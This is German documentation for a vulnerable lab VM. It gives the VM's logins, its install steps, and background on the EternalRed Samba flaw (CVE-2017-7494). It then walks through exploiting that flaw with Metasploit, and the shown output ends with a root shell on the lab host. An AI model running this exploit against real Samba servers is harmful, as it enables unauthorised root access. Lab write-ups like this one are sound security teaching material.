# Dokumentation

## VM
### Passwort
root:toor
user:resu

### Infos
Debian 9, 64 bit

### Installation
```console
# mkdir /tmp/install
# mv install.sh /tmp/install
# cd /tmp/install
# bash install.sh
# reboot
```
Für mehr Infos siehe install.sh

https://www.miltonsecurity.com/company/blog/eternalred-cve-2017-7494

# Hintergrund zur Schwachstelle
Zur Zeit der Veröffentlichung kam die Frage auf, ob EternalRed das gleiche Risiko darstellen könnte wie WannaCry bzw. EternalBlue, denn sie weist einige Ähnlichkeiten auf.
Dennoch gibt es einige wesentliche Unterschiede. 
Ähnlich wie die von WannaCry ausgenutzte Schwachstelle zielt diese Schwachstelle auf SMB ab, wenn auch eine andere Implementierung des Protokolls. Sie birgt auch die Gefahr, "wormable" (wurmhaft) zu sein, d.h. Malware kann sie nutzen, um sich automatisch von System zu System zu verbreiten.

EternalRed ist jedoch nach wie vor viel schwieriger auszunutzen, da sie nicht nur veraltete Software, sondern auch eine bestimmte Konfiguration erfordert, wie z.B. anonymer Schreibzugriff auf einen Share. 
Beispiele wie diese Samba-Schwachstelle verstärken jedoch weiterhin die anhaltende Notwendigkeit einer kontinuierlichen Sicherheitstransparenz, um Patches und Systemkonfigurationsupdates zu priorisieren, und für vollständige Datensicherungen kritischer Dateien, um die Ausfallsicherheit des Unternehmens zu gewährleisten.

https://blog.qualys.com/securitylabs/2017/05/26/samba-vulnerability-cve-2017-7494

# Exploit
## msfconsole use linux/samba/is_known_pipename
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rbv

```console
# nmap 10.0.2.14 -sV -p-

Starting Nmap 7.60 ( https://nmap.org ) at 2019-05-21 20:22 CEST
Nmap scan report for 10.0.2.14
Host is up (0.00023s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: MIN-DEB-PROTO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds

# msfconsole

msf> search samba
[...]
exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
[...]

msf> use exploit/linux/samba/is_known_pipename
msf exploit(linux/samba/is_known_pipename) > show options 

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS                           yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)
msf exploit(linux/samba/is_known_pipename) > set rhosts 10.0.2.14
rhosts => 10.0.2.14
msf exploit(linux/samba/is_known_pipename) > run

[*] 10.0.2.14:445 - Using location \\10.0.2.14\Share\ for the path
[*] 10.0.2.14:445 - Retrieving the remote path of the share 'Share'
[*] 10.0.2.14:445 - Share 'Share' has server-side path '/tmp
[*] 10.0.2.14:445 - Uploaded payload to \\10.0.2.14\Share\graTaYLq.so
[*] 10.0.2.14:445 - Loading the payload from server-side path /tmp/graTaYLq.so using \\PIPE\/tmp/graTaYLq.so...
[-] 10.0.2.14:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.0.2.14:445 - Loading the payload from server-side path /tmp/graTaYLq.so using /tmp/graTaYLq.so...
[+] 10.0.2.14:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.5:39481 -> 10.0.2.14:445) at 2019-05-21 20:26:02 +0200

whoami
root

```

